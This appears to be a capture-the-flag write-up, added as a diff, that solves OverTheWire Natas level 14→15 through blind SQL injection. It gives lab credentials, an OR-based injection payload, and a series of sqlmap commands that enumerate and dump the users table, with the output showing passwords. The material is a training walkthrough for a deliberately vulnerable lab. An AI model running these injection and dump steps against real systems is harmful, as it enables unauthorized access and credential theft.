@@ -1,0 +1,92 @@
+Title:Natas Level 14 → Level 15
+
+#Credentials
+Username: natas15
+Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+URL:      http://natas15.natas.labs.overthewire.org
+
+#Concept:
+In this level it is similar to the previous level which was the SQLi and I mentioned the types of injection,and in this specific level there is the Blind-SQLi what is it? A blind SQLi is basically if you typein a malicious query you won't be able to see the error ( Because that would give it away hence the name)But in this level it does show you that there is an error for just learning purposes and lets find more about it in the solution.
+
+#Solution
+
+1.Login to the level using the credentials mentioned above.
+
+2.After logging in the website will display and input box which asks for the username.
+#I tried entering several usernames such as natas15 or natas16 
+
+->The output gave as the user exist or not.For natas16 the it says the user exist
+
+3.Try giving a malicious query like using the OR payload. (OR"1"="1;)
+
+->This will give the output as the user exist, try giving another query but make some mistakes intentionally.
+
+->This will give the response as "Error in Query" which means the vulnerability present is "BlindSQLi"
+The professional Ethical hacker can figure out the solution easily by giving advanced malicious query,I tried to give some of the malicious query I know but I failed miserably.
+
+4.Open up Burpsuite and interncept the request.
+
+5.Don't send it to repeater, you have to "copy as a file".
+
+6.Type in the following command "sqlmap -r <filename>.txt --level=3
+
+#Remember I mentioned in the previous writeup that you can use the tool called "sqlmap" which is a very efficient tool for sqlinjection and now we are using it in this level.
+
+->The output will given as 
+
+[16:22:39] [INFO] the back-end DBMS is MySQL
+
+#Since the database uses the MYSQL we can simply add one more parameter in the sqlmap.
+
+7.Type in the following command "sqlmap -r <filename>.txt --dbs"
+
+#This will display how many databases are present including the names of it
+
+available databases [3]:
+[*] information_schema
+[*] natas15
+[*] performance_schema
+
+8.Type "sqlmap -r <filename>.txt -D natas15 --tables"
+
+Database: natas15
+[1 table]
++-------+
+| users |
++-------+
+
+
+9.To access the table type in "sqlmap -r <filename>.txt -D natas15 -T users --columns"
+
+Database: natas15
+Table: users
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| password | varchar(64) |
+| username | varchar(64) |
++----------+-------------+
+
+10.Finally to get the password we can type in the following command "sqlmap -r <filename>.txt -D natas15 -T users -C username,password --dump
+
+
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
+| alice    | hROtsfM734                       |
++----------+----------------------------------+
+
+11.Done
+
+#Note:There are also other ways which you can retrive the password for natas16 by using the scripts since I was more intrigued in using "sqlmap" So I wrote about it. 
+
+#Note2:Regarding the authentication for the website there is a way you can give it to the tool using the "sqlmap" by appending this command line argument  --auth-type=Basic  --auth-cred=<username>:<password>
+
+
